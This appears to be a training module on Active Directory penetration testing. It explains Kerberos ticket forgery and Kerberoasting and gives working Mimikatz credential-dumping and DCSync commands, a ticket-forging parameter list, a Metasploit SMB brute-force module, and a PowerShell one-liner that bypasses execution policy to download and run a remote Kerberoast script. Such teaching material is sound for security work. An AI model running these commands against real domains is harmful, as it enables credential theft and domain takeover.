# Active Directory Penetration Testing

#### Module Objective
- Review the features of Active Directory  
- Explore attacks against an Active Directory environment 
- Conduct Active Directory attacks

### Steps
- Reconnaissance
- Brute Force Active Directory (AD)
  
## Reconnaissance
```powershell
c:\ > net user                          : Return the users on the machine.   
c:\ > whoami                            : Shows the current user associated with the AD who is logged in  
c:\ > whoami /groups                    : Shows the current group  
c:\ > net user /domain                  : All users from any group in the AD Shows  
c:\ > net user [username] domain        : Shows every user’s group  
```

## ADRecon  
ADRecon is a tool that extracts and combines various artefacts (as described below) from an Active Directory (AD) environment. The information can be presented in a specially formatted Microsoft Excel report that includes summary views with metrics to facilitate analysis and provide a holistic picture of the current state of the target AD environment. The tool is useful for various classes of security professionals such as auditors, DFIR, students, and administrators. It can also act as an invaluable post-exploitation tool for a penetration tester.

ADRecon can be run from any workstation that is connected to the environment, including hosts that are not domain members. Furthermore, the tool can be executed in the context of a non-privileged (i.e. standard domain user) account. Fine-Grained Password Policy and BitLocker may require Privileged user accounts. The tool will use Microsoft Remote Server Administration Tools (RSAT) if available; otherwise, it will communicate with the domain controller using Lightweight Directory Access Protocol (LDAP). 

The following information is gathered by the tool: 

- Forest 
- Domain 
- Trusts 
- Sites 
- Subnets 
- Default and Fine-Grained Password Policy (if implemented)
- Domain controllers, Server Message Block (SMB) versions, whether SMB Signing is supported, and Flexible Single-Master Operations (FSMO) roles
- Users and their attributes 
- Service Principal Names (SPNs) 
- Groups and memberships 
- Organizational Units (OUs) 
- Group Policy Objects (GPOs) and GPLink details 
- Domain Name System (DNS) zones and records 
- Printers 
- Computers and their attributes 
- Password attributes (Experimental) 
- Local Administrator Password Solution (LAPS) passwords (if implemented) 
- BitLocker Recovery Keys (if implemented) 
- Access-control lists (ACLs) (Discretionary access-control list (DACLs) and system access-control list (SACLs)) for the Domain, OUs, Root Containers, GPOs, Users, Computers and Groups objects
- GPO Report (requires RSAT) 
- Kerberoast (not included in the default collection method) 
- Domain accounts used for service accounts (requires a privileged account and not included in the default collection method).

![User_Account_Details](https://github.com/user-attachments/assets/cf39d8e0-5ee9-4ff0-b6ed-2955d56ff76c)

- Tool from Sense of Security (https://senseofsecurity.com)
- Provides extensive enumeration of an AD environment
- Can be run from local or remote machine
- Does not require a privileged user account 

## ADRecon — Groups  
![image](https://github.com/user-attachments/assets/9e026195-4bcb-426b-a3ad-aed24cc44d21)

Upon getting all the AD users, take a look at the group policy. The group policy is a feature of Microsoft Windows NT family of operating systems that controls the working environment of user and computer accounts. In the group policy, environment policy such as “Account Lockout Policy” can be seen.

After acquiring all the required data, you can now execute different attacks based on the collected data.

## Active Directory — Kerberos Attacks  
The issues are primarily related to the legacy support in Kerberos when AD was released in the year 2000 with Windows Server 2000. This legacy support is enabled when using Kerberos RC4 encryption (RC4_HMAC_MD5) since the NT LAN Manager (NTLM) password hash is used extensively with this encryption type. 

Several Kerberos attacks take advantage of Microsoft’s legacy support in AD. When Microsoft released Windows 2000 and AD along with it, they needed to support Windows NT and Windows 95, which generated a wide range of security issues (and less secure configurations). Microsoft thus needed to support several different clients and enable them to speak Kerberos. The easy method to do this was to use the NTLM password hash as the Kerberos RC4 encryption private key is used to encrypt/sign Kerberos tickets. Once the NTLM password hash is discovered, it can be used in a variety of ways, including re-compromising the AD domain (think Golden Tickets and Silver Tickets). 

RC4 Kerberos encryption continues to be supported even today. While AES Kerberos encryption is now used by default on the newer operating systems, RC4 Kerberos encryption may still be significantly used on the network, involving some interesting network devices that have AES Kerberos encryption disabled by default. 

See NetApp for example: 

Kerberos-related communication for Common Internet File System (CIFS) is used during CIFS server creation on the Storage Virtual Machine (SVM), as well as during the SMB session setup phase. The CIFS server supports the following encryption types for Kerberos communication: 
- RC4-HMAC
- DES 
- AES 128 
- AES 256

With the introduction of AES as a Kerberos encryption option, Windows uses AES for hashing, which is a deviation from traditional Windows password hashing methods. This means that while Kerberos RC4 encryption leveraged the NTLM password hash as encryption key, Kerberos AES encryption uses the AES hash to encrypt the Kerberos tickets (in other words, when AES is the Kerberos encryption).

### Kerberos Attacks Examples:  
- SPN Scanning:  
Finding services by requesting service principal names (SPNs) of a specific SPN class/type

- Silver Ticket:  
Forged Kerberos Ticket Granting Service (TGS) service ticket 

- Golden Ticket:  
Forged Kerberos Ticket Granting Ticket (TGT) authentication ticket 

- MS14-068 Forged PAC Exploit:  
Exploitation of the Kerberos vulnerability on Domain Controllers

- Diamond PAC:  
Blended attack type using elements of the Golden Ticket and the MS14-068 forged PAC

- Skeleton Key In-memory Malware:  
Malware “patches” the LSASS authentication process in-memory on Domain Controllers to enable a second, valid “skeleton key” password that can be used to authenticate any domain account. 

## Silver Ticket  
As a Silver Ticket is a forged Ticket Granting Service (TGS), there is no communication with the Domain Controller.
Domain  

![Silver Ticket](https://github.com/user-attachments/assets/1d7f85f6-68a7-462e-a895-c0cc647ff3fa)

The Kerberos Silver Ticket is a valid Ticket Granting Service (TGS) Kerberos ticket, since it is encrypted/signed by the service account configured with an SPN for each server that the Kerberos-authenticating service runs on.

While a Golden ticket is a forged Ticket Granting Ticket (TGT) valid for gaining access to any Kerberos service, the silver ticket is a forged TGS. This means that the scope of the Silver Ticket is limited to whatever service is targeted on a specific server.

While a Golden ticket is encrypted/signed with the domain Kerberos service account (KRBTGT), a Silver Ticket is encrypted/signed by the service account (the computer account credential extracted from the computer’s local Security Account Manager (SAM) or service account credential).

Most services do not validate the Privileged Attribute Certificate (PAC) (by sending the PAC checksum to the domain controller for PAC validation); therefore, a valid TGS generated with the service account password hash can include a PAC that is entirely fictitious —even claiming the user is a Domain Admin without challenge or correction.

The attacker needs the service account password hash. Because the TGS is forged, there is no associated TGT, meaning that the domain controller is never contacted. Any event logs are on the targeted server.

Silver Tickets can be more dangerous than Golden Tickets — while the scope is more limited than Golden Tickets, the required hash is easier to get and there is no communication with a domain controller when using them. Therefore, detecting Silver Tickets is more difficult than detecting Golden Tickets.

### Creating Silver Tickets  
In order to create or forge a Silver Ticket, the attacker has to gain knowledge of the password data (password hash) for the target service. If the target service is running under the context of a user account such as MS SQL, then the Service Account’s password hash is required in order to create a Silver Ticket.

Cracking Service Account passwords with Kerberoast is one potential method for identifying a target service’s associated password data. 

Computers also host services with the most common one being the Windows file share that leverages the “cifs” service. Since the computer itself hosts this service, the password data required to create a Silver Ticket is the associated with the computer account’s password hash. When a computer is joined to AD, a new computer account object is created and linked to the computer. The password and associated hash are stored on the computer that owns the account, and the NTLM password hash is stored in the AD database on the Domain Controllers for the domain. 

If an attacker can gain admin rights to the computer (to gain debug access) or be able to run code as local System, the attacker can dump the AD computer account password hash from the system using Mimikatz (the NTLM password hash is used to encrypt RC4 Kerberos tickets) as follows: 
```shell
Mimikatz “privilege::debug” “sekurlsa::logonpasswords” exit
```
#### Mimikatz Silver Ticket : Commands
```shell
/domain            : The fully qualified domain name
/sid               : The SID of the domain
/user              : Username to impersonate
/groups            : Group RIDs the user is a member of (the first is the primary group) default: 513, 512, 520, 518, 519 for well-known Administrator’s groups
/ticket            : Provide a path and name for saving the Golden Ticket file for later use. Otherwise, use /ptt to immediately inject the Golden Ticket into memory for use.
/ptt               : As an alternate to /ticket, use /ptt to immediately inject the forged ticket into memory for use.
/id                : User RID. Mimikatz default is 500 (the default Administrator account RID)
/startoffset       : The start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.
/endin             : Ticket lifetime. Mimikatz Default value is 10 years.
/renewmax          : Maximum ticket lifetime with renewal

/target            : The target server’s FQDN
/service           : The Kerberos service running on the target server. This is the SPN class (or type) such as cifs, http, or mssql.
/rc4               : The NTLM hash for the service (computer account or user account) Description 
```

#### Silver Ticket Default Groups 
- Domain Users SID: S-1-5-21<DOMAINID>-513
- Domain Admins SID: S-1-5-21<DOMAINID>-512
- Schema Admins SID: S-1-5-21<DOMAINID>-518
- Enterprise Admins SID: S-1-5-21<DOMAINID>-519
- Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520 

## Golden Ticket  
Golden Tickets are forged Ticket Granting Tickets (TGTs), also called authentication tickets.

![Golden Tickets](https://github.com/user-attachments/assets/a44082c9-4034-4c74-aa75-1b37ef849c8a)

Golden Tickets are forged Ticket Granting Tickets (TGTs), also called authentication tickets. The communication with the Domain Controller. Since a Golden Ticket is a forged TGT, it is sent to the domain controller as part of the TGS-REQ to get a service ticket.

The Kerberos Golden Ticket is a valid TGT Kerberos ticket since it is encrypted/signed by the domain Kerberos account (KRBTGT). The TGT is only used to prove to the Key Distribution Center (KDC) service on the domain controller that the user was authenticated by another domain controller. The fact that the TGT is encrypted by the KRBTGT password hash and can be decrypted by any KDC service in the domain proves that it is valid (along with PAC validation).

### Golden Ticket Requirements
- Domain Name [AD PowerShell module: `(Get-ADDomain).DNSRoot`]
- Domain SID [AD PowerShell module: `(Get-ADDomain).DomainSID.Value`]
- Domain KRBTGT Account NTLM password hash
  
## Golden Ticket Limitations  
Despite their many advantages, Golden Tickets have been “limited” to spoofing Admin rights to the current domain. The limitation exists when the KRBTGT account password hash is exposed in a child domain that is part of a multi-domain AD forest. The issue is that the parent (root) domain contains the forest-wide admin group, Enterprise Admins. Since Mimikatz adds group membership using Relative IDentifiers (RIDs) to the ticket, the 519 (Enterprise Admin) RID is identified in the Kerberos ticket as being local to the domain it was created in (based on the KRBTGT account domain). If the domain Security IDentifier (SID) created by taking the domain SID and appending the RID does not exist, then the holder of the Kerberos ticket does not receive that level of access.

In other words, in a multi-domain AD forest, if the domain the Golden Ticket was created in does not contain the Enterprise Admins group, the Golden Ticket will not provide admin rights to other domains in the forest.

## Golden Ticket + SID History  
- Added to Mimikatz at the request of Scott Metcalf
- Provides Golden Ticket capability across the forest
- In a migration scenario, for a user who has migrated from DomainA to DomainB, the original DomainA user SID is added to the new DomainB SIDHistory attribute.
- The SID can be added to SID History to expand access.

The creator of adsecurity.org asked the creator of Mimikatz to add SID History so that the attack would work across the forest. After SID History was added, it works across the forest. 

Things became more interesting after Mimikatz began to support SID History in Golden Tickets (and Silver Tickets), since any group in the AD Forest could now be included and used for authorization decisions. In order to support research into how to expand access using SID History in Kerberos tickets across trusts (both intra-forest and external), Benjamin Delpy added SID History into mimikatz.

## Service Principal Names (SPNs)  
- Services that support Kerberos authentication require an SPN.
- Discover the SPN in the AD environment.
- LDAP queries are used to discover SPNs inside an internal network.
- Since any user can request a TGS for any service that has a registered SPN in a user or computer account in AD and because part of a TGS requested for an SPN instance is encrypted with the NTLM hash of a service account’s plaintext password, any user can request these TGS tickets and then crack the service account’s plaintext password offline, without the risk of account lockout!

Because of how Kerberos works, any user can request a TGS for any service that has a registered SPN (HOST or arbitrary) in a user or computer account in AD. Remember that merely requesting this ticket does not grant access to the requesting user, as the server/service ultimately determines whether the user should be given access. 

To reiterate, any domain user account that has an SPN set can have a TGS for that SPN requested by any user in the domain, allowing for the offline cracking of the service account plaintext password! This is obviously dependent on a crackable service account plaintext, but service accounts luckily tend to often have simple passwords that change very infrequently.

## Kerberoasting via PowerShell  
- Empire has been deprecated but continues to be available ... so far!
- The following command works on older boxes:
  - RC4
  ```powershell
  powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).Down loadString('https://raw.gi thubusercontent.com/Empire Project/Empire/master/data /module_source/credentials /Invoke-Kerberoast.ps1') ; Invoke-Kerberoast - OutputFormat HashCat|Select-Object - ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
  ```
This one-liner instructs PowerShell to relaunch, but this time, set the ExecutionPolicy to bypass. This enables untrusted scripts to be run.

The `“New-Object System.Net.WebClient).DownloadString”` is used to download the `Invoke-Kerberoast.ps1` script from the defined location, after which the script is loaded into memory.

The final section `Invoke-Kerberoast -OutputFormat HashCat | Select-Object - ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt` runs the Kerberoast request, after which it details how the results should be returned. 

In the above example, they are set to match hashcat’s password cracking tools file format requirements, followed by the defined name and file type. 

Summarizing, it downloads the script, runs it all in RAM, and outputs the results ready to crack using hashcat. 

After running the one-liner, no response should appear.

## ADRecon — Kerberoast  
Has a Kerberroast module
```powershell
PS C:\Users\Administrator\Desktop> .\ADRecon.ps1 -Collect Kerberoast

[-] Kerberoast
Username ServicePrincipalName  John
-------- --------------------  ----
user     http/blah.sos.labs:80 $krP5tgsah.sos.1abs:80:2D3F45B329C2C2
user     http/DC1.sos.labs:80  $krP5tgsah.sos.1abs:80:2D3F45B329C2C2

[*] Total Execution Time (mins): 0.00
```

## Brute Force AD  
- Dangerous due to lockout policies Use discretion
- `msf > use auxiliary/scanner/smb/smb_login`
- All hashes are stored in a file named “NTDS.dit” in this location.
  - C:\Windows\NTDS
- Use mimikatz
  - mimikatz # lsadump::dcsync /domain:cpent.local /all /csv
 
## LAB Active Directory
